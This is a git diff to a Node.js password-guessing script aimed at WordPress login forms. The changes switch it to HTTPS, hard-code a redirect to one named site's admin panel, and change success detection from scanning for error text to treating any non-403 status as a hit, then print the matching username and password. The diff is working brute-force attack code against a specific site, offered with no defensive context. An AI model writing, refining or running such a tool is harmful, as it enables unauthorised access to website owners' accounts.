@@ -1,7 +1,7 @@
 #!/bin/node
 
 const fs = require('fs');
-const http = require('http');
+const http = require('https');
 const querystring = require('querystring');
 
 const url = process.argv[2];
@@ -33,7 +33,9 @@ function makeRequest(password) {
   const formData = querystring.stringify({
     log: username,
     pwd: password,
-    'wp-submit': 'Acceder'
+    'wp-submit': 'Log In',
+    redirect_to: 'https://www.thecatniptimes.com/wp-admin/',
+    testcookie: 1
   });
   const options = {
     method: 'POST',
@@ -49,7 +51,7 @@ function makeRequest(password) {
         responseData += chunk;
       });
       res.on('end', () => {
-        resolve(responseData);
+        resolve({responseData, status: res.statusCode});
       });
     });
     req.on('error', (error) => reject(error));
@@ -57,8 +59,9 @@ function makeRequest(password) {
     req.end();
   })
     .then(data => {
-      if (!data.includes('<strong>ERROR</strong>')) {
-        process.stdout.write(`\rusername: ${username}password: ${password}\n`);
+      // console.log(data.status);
+      if (data.status !== 403) {
+        process.stdout.write(`\rusername: ${username}, password: ${password}\n`);
       }
     })
     .catch(error => console.error(error));
